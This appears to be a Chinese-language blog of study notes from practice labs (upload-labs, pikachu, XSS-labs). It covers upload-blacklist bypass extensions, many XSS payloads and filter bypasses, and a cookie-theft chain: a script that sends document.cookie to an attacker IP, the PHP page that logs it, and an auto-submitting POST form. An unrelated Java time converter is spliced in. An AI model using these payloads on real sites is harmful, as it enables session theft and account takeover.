return false; }} 然后就可以上传了 方法二： less-2 less-3这次使用了黑名单后端过滤 并且还会对上传的文件重命名 尝试其他php后缀 123456789.php3.php4.php5.php7.phps.php-s.pht.phar.phtml 上传php5成功在源代码看到上传路劲 蚁剑返回为空说明未被解析成功不解析说明在appache的httpd.conf里面没有下面这一行 1AddType application/x-httpd-php .php .php3 .php5 .phtml 我们这里如果不是本地的靶场就无法去修改这个文件 然后就可以了 XSSlabs基础xss，跨站脚本攻击 嵌入网页，主要攻击客户端 用户名信息键盘详细cookie密码 1.request2.回index.html,index.php 读取客户想要访问的页面3.浏览器解析执行html展示页面效果 response 攻击代码一般是前端js代码浏览器解析攻击代码1.获取用户名密码2.发送给hacker3.基于你的身份登录，系统如果是后台管理员系统，为所欲为 前端Javascript，VBscript XSS分类反射型，Dom型，存储型 有输入输出的地方都可以尝试XSS，有输出可以做xss 存储型： 发送一段js代码，服务器保存到数据库里面了，一般在留言板，评论区，注册等页面，存储型反射型： 发了什么，然后服务器直接返回到客户端了，一次性 ，一般在查询类页面，这叫反射型DOM型，又有反射，又有存储 输入jaden 直接返回jaden 点下面这个直接找到input标签的代码 这个input做了长度限制修改 1&lt;script&gt;alert(123);&lt;/script&gt; 出现弹框窗口，执行成功 存储型执行，点击其他去页面返回仍然会显示 DOMDOM全称是DocumentObjectModel，也就是文档对象模型 ==通过js代码操作文档对象模型触发的漏洞 1xxx' onclick=&quot;alert('xss')&quot;&gt; dom型xss-x 源代码 12345678910 function domxss(){ var str = window.location.search; var txss = decodeURIComponent(str.split(&quot;text=&quot;)[1]); var xss = txss.replace(/\\+/g,' ');// alert(xss); document.getElementById(&quot;dom&quot;).innerHTML = &quot;&lt;a href='&quot;+xss+&quot;'&gt;就让往事都随风,都随风吧&lt;/a&gt;&quot;; } //试试：'&gt;&lt;img src=&quot;#&quot; onmouseover=&quot;alert('xss')&quot;&gt; //试试：' onclick=&quot;alert('xss')&quot;&gt;,闭合掉就行 1'onclick=&quot;alert('xss')&quot; 可能触发DOM型XSS的js操作： 12345document.refererwindow.namelocationinnerHTMLdocument.write 闭合标签 1234'onclick=&quot;alert(1111)&quot;'onclick=&quot;alert('xss')&quot;&gt;'&gt;&lt;img src=&quot;#&quot; onmouseover=&quot;alert('xss')&quot;&gt;&lt;a href=&quot;'&lt;/a&gt;&lt;script&gt;alert(1);&lt;/script&gt;&quot;&gt;what do you see?&lt;/a&gt; 工具测试 自动化工具AWVS，APPscan，xray等大型工具，xssstrike 手工测试 实战过程：想要盗取别人的cookie信息的话有一个前提条件，就是你应该在别人触发你的xss攻击时，你的代码应该将收集hJkie信息发送给你的平台来接收，这样才获取到了数据 12&quot;&gt;&lt;script&gt;document.location ='http://192.168.0.15/pikachu/pkxss/xcookie/cookie.php?cookie='+document.cookie;&lt;/script&gt; 这个ip192.168.0.15是黑客ip然后这里因为有点麻烦，我就直接在本机上操作了获取cookie的代码 1234567891011121314151617181920&lt;?phpinclude_once '../inc/config.inc.php';include_once '../inc/mysql.inc.php';$link=connect();//这个是获取cookie的api页面if(isset($_GET['cookie'])){ $time=date('Y-m-d g:i:s'); $ipaddress=getenv ('REMOTE_ADDR'); $cookie=$_GET['cookie']; $referer=$_SERVER['HTTP_REFERER']; $useragent=$_SERVER['HTTP_USER_AGENT']; $query=&quot;insert cookies(time,ipaddress,cookie,referer,useragent) values('$time','$ipaddress','$cookie','$referer','$useragent')&quot;; $result=mysqli_query($link, $query);}header(&quot;Location:http://192.168.1.4/pikachu/index.php&quot;);//重定向到一个可信的网站?&gt; 控制台 1location.href='www.baidu.com'; 给某个网址发请求，跳转到网址 1document.cookie 1location.href='http:jd.com?cookie='document.cookie; 黑客的主机跑网站 xss的post获取cookie登录 1234567891011121314151617181920212223242526&lt;html&gt;&lt;head&gt;&lt;script&gt;window.onload = function() { document.getElementById(&quot;postsubmit&quot;).click();}&lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;form method=&quot;post&quot; action=&quot;http://127.0.0.1/pikachu/vul/xss/xsspost/xss_reflected_post.php&quot;&gt; &lt;input id=&quot;xssr_in&quot; type=&quot;text&quot; name=&quot;message&quot; value= &quot;&lt;script&gt;document.location = 'http://192.168.1.15/pkxss/xcookie/cookie.php?cookie=' + document.cookie; &lt;/script&gt;&quot; /&gt; &lt;input id=&quot;postsubmit&quot; type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;submit&quot; /&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;window.onload = function() { document.getElementById(&quot;postsubmit&quot;).click();} onload当浏览器加载完页面所有内容后自动触发执行 12345678910111213141516171819202122232425import java.text.SimpleDateFormat;import java.util.Date;import java.util.Scanner;public class SimpleTimeConverter { public static void main(String[] args) { Scanner scanner = new Scanner(System.in); System.out.print(&quot;请输入13位的毫秒数: &quot;); long milliseconds = scanner.nextLong(); // 创建Date对象 Date date = new Date(milliseconds); // 创建时间格式化对象（24小时制） SimpleDateFormat sdf = new SimpleDateFormat(&quot;HH:mm:ss&quot;); // 格式化时间 String timeString = sdf.format(date); System.out.println(&quot;24小时制时间: &quot; + timeString); scanner.close(); }} 一打开就访问漏洞代码 level1用后端语言php渲染html标签 1http://xss:4556/level1.php?name=&lt;a href=&quot;http://baidu.com&quot;&gt;db&lt;/a&gt; 直接 1&lt;script&gt;alert()&lt;/script&gt; level2对进行了base64 1window['alert'](&quot;先抱真帅&quot;) 页面源代码 尝试闭合构造新语句 1&quot;&gt;&lt;script&gt;alert()&lt;/script&gt; level31' onfocus=javascript:alert() ' onfocus事件在元素获得焦点时触发，最常与&lt;input&gt;、&lt;select&gt; 和 &lt;a&gt; 标签一起使用，以上面图片的html标签&lt;input&gt;为例，&lt;input&gt;标签是有输入框的，简单来说，onfocus事件就是当输入框被点击的时候，就会触发myFunction()函数，然后我们再配合javascript伪协议来执行javascript代码 level4 尝试用双引号闭合 1&quot; onfocus=javascript:alert() &quot; level5 1?keyword=&quot;&gt; &lt;a href=javascript:alert()&gt;xxx&lt;/a&gt; &lt;&quot; level6 尝试大小写绕过 123&quot;&gt; &lt;a hRef=javascript:alert()&gt;x&lt;/a&gt; &lt;&quot;&quot; Onfocus=javascript:alert() &quot;&quot;&gt; &lt;sCript&gt;alert()&lt;/sCript&gt; &lt;&quot; level7双拼写绕过","link":"/2025/12/13/%E9%9D%B6%E5%9C%BA/"}],"tags":[],"categories":[],"pages":[{"title":"","text":"google-site-verification: google0ce01516f2d5551f.html","link":"/static/google0ce01516f2d5551f.html"}]}